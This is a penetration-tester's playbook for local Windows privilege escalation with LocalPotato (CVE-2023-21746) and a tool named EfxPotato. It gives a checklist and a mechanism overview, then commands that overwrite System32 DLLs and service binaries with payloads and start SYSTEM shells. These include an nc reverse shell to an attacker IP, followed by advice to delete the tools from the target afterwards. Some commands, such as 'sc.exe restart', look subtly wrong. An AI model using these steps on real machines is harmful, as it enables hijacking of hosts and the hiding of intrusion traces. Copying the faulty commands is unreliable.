## LocalPotato & EfxPotato

> [!abstract]+ **Scope**: Local Windows privilege escalation using LocalPotato (CVE-2023-21746) and EfxPotato; local SMB-to-RPC/HTTP NTLM authentication reflection, arbitrary file creation, and execution procedures on Windows 10, Windows 11, and Windows Server 2022.

- [ ] Confirm `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` via `whoami /priv`.
- [ ] Transfer `LocalPotato.exe` or `EfxPotato.exe` to a writable directory on the target host.
- [ ] Execute `LocalPotato` to write an arbitrary payload file into a protected system path.
- [ ] Execute `EfxPotato` to trigger local RPC authentication and spawn a process as `SYSTEM`.
- [ ] Confirm elevated access context via `whoami`.

---

## How LocalPotato & EfxPotato work

- LocalPotato (CVE-2023-21746) and EfxPotato bypass post-1809 NTLM reflection mitigations on Windows 11 and Windows Server 2022.
- Traditional DCOM reflection exploits (such as [[🛠️ JuicyPotato]]) failed on modern builds because `RPCSS` OXID resolution was restricted to TCP port `135`.
- LocalPotato bypasses local authentication reflection barriers through local SMB-to-RPC/HTTP context swapping across five execution steps:

  1. **Triggering local SMB authentication**: LocalPotato initiates a local SMB connection to an attacker-controlled local socket endpoint.
  2. **Intercepting NTLM type 1 / type 2 messages**: The exploit captures local NTLM negotiation messages generated by `LSASS`.
  3. **Reflecting context to local RPC interfaces**: LocalPotato reflects the captured NTLM challenge to a local system service (such as the Storage Service `StorSvc` RPC interface or WinRM HTTP endpoint) running as `NT AUTHORITY\SYSTEM`.
  4. **Achieving arbitrary file write**: Tricking the target system service into executing authenticated file operations under its `SYSTEM` context allows LocalPotato to write arbitrary files into protected system directories (such as `C:\Windows\System32\`).
  5. **Executing EfxPotato process spawning**: EfxPotato extends local RPC coercion by targeting Encrypting File System (EFS) or scheduled task RPC interfaces, coercing local authenticated calls and launching processes directly via token duplication.

> [!note] See [[Access tokens and impersonation]] for details on access token impersonation and primary token conversion.

## Gathering prerequisite information

- Check active user privileges:

```powershell
whoami /priv
```

## Local privilege escalation via LocalPotato

- LocalPotato allows a user holding `SeImpersonatePrivilege` to write arbitrary files to locations writable by `NT AUTHORITY\SYSTEM`.
- Privilege escalation is achieved by replacing a service binary or overwriting a DLL loaded by a privileged service.

- Execute `LocalPotato.exe` to copy a payload DLL into `C:\Windows\System32\`:

```powershell
LocalPotato.exe -i C:\Windows\Temp\payload.dll -o C:\Windows\System32\target_app.dll
```

- Execute `LocalPotato.exe` specifying custom source and target file paths:

```cmd
LocalPotato.exe -i C:\Users\Public\replacement.exe -o C:\Program Files\TargetService\service.exe
```

### Command parameter reference

| Option | Description |
| :--- | :--- |
| `-i` | Specifies path to the source payload file readable by the current user. |
| `-o` | Destination file path written under the `NT AUTHORITY\SYSTEM` context. |

> [!tip]+ Triggering payload execution after LocalPotato file write
> - After writing a payload DLL via LocalPotato, restart the target service using `sc.exe restart <ServiceName>` or trigger DLL loading via standard application execution to obtain a shell as `NT AUTHORITY\SYSTEM`.

## Local privilege escalation via EfxPotato

- EfxPotato targets local RPC interface coercions (such as EFS RPC calls) to spawn commands directly as `NT AUTHORITY\SYSTEM`.

- Download or transfer `EfxPotato.exe` to the target machine.
- Spawn a command shell as `SYSTEM`:

```powershell
EfxPotato.exe -c "cmd.exe /c whoami"
```

- Launch a reverse shell to your listener:

```powershell
EfxPotato.exe -c "C:\Windows\Temp\nc.exe <attacker_ip_address> 4444 -e cmd.exe"
```

### Command parameter reference

| Option | Description |
| :--- | :--- |
| `-c` | Specifies command string executed under the `NT AUTHORITY\SYSTEM` security token. |
| `-p` | Custom named pipe name for RPC binding (optional). |

## Troubleshooting

- `0x80070005` / Access Denied during LocalPotato write
  - Target output directory is not writable by `SYSTEM` or file is currently locked by a running process.
- EfxPotato RPC binding fails
  - Target RPC interface (e.g. EFS service) is disabled; verify service status or test an alternative potato vector.

> [!tip]+
> - Execute `whoami` inside the spawned shell context to verify `NT AUTHORITY\SYSTEM` execution.
> - Remove transferred binaries (`LocalPotato.exe`, `EfxPotato.exe`, payload files) from the target host upon completion.
